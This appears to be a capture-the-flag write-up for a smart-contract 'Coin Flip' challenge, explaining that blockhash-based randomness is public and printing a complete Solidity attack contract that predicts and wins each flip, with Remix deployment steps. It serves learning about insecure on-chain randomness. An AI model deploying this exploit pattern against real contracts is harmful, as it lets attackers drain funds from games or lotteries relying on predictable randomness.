# Coin Flip Challenge - Level 3 🚧 Update In Progress 🏗

```yml
This smart contract has a vulnerability, it's use of the public source of randomness makes it vulnerable because:
```
- the ethereum blockchain is fully transparent and everything is public and can be viewed,

```Solidity
/**  
* @notice Blockhash and block.number are globally accessible variables available to everyone, 
* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
* The best practice in this case would be to introduce a source of randomness into a contract with a 
* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
* Solidity and everything is publicly visible in the contract.
*/
/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
function flip(bool _guess) public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
  uint256 coinFlip = blockValue.div(FACTOR); 
  bool side = coinFlip == 1 ? true : false;
```
  - after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
    - the player calls this flip function 10 times in a row to win.

```Solidity
victimContract.flip(side);
```

## 💥 The attack contract in detail:

```yml
The attack contract starts with importing the victim contract:
```
- this will be used in the attack contract's constructor,

```Solidity
// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.5.0; 

import "./CoinFlip.sol";
// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

/// @title attack contract, calculates correct side 10 times in a row
/// @author Web3 Blockchain Developer 
contract CoinFlipAttack {
    /** 
    * @notice Using for directive, using imported SafeMath functions from openzeppelin,
    * for unit256 to prevent overflow and underflow attacks. 
    */
    using SafeMath for uint256;
```
- the public state variable victimContract references the victim contract as CoinFlip and will be assigned by the player when the attack contract is deployed using the constructor,
- the attack contract also uses the state variable FACTOR from the victim contract,
- the constructor receives the victim contract address from the player and references the victim contract with CoinFlip(_victimContractAddr), this address is assigned as the public state variable victimContract,

```Solidity
/// @notice public state variable assigned in constructor
    CoinFlip public victimContract; 
    
    // state variable assigned in function flip()
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    /** 
    * @notice victim address belonging to CoinFlip assigned as public state variable victimContract 
    * during deployment of attack contract 
    */
    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }
```
- finally the attack begins,
- after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
    - the player calls this flip function 10 times in a row to win.

```Solidity

/**  
* @notice Blockhash and block.number are globally accessible variables available to everyone, 
* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
* The best practice in this case would be to introduce a source of randomness into a contract with a 
* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
* Solidity and everything is publicly visible in the contract.
*/
/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
function flip() public returns(bool) {
  uint256 blockValue = uint256(blockhash(block.number.sub(1)));
  
  uint256 coinFlip = blockValue.div(FACTOR); 
        
  bool side = coinFlip == 1 ? true : false;

  victimContract.flip(side);
    }
}

```
## 💥 The attack contract locked and loaded in REMIX IDE

```yml
Fire away at that flip button, ten times:
```
- lower left of the image, under the Deployed Contracts section, orange button labeled flip.

<p align="left" >
<img width="506" height="512" src="https://user-images.githubusercontent.com/104662990/199078205-0c19814b-c867-46bf-8b1e-9404585037af.png">
</P>



    
    
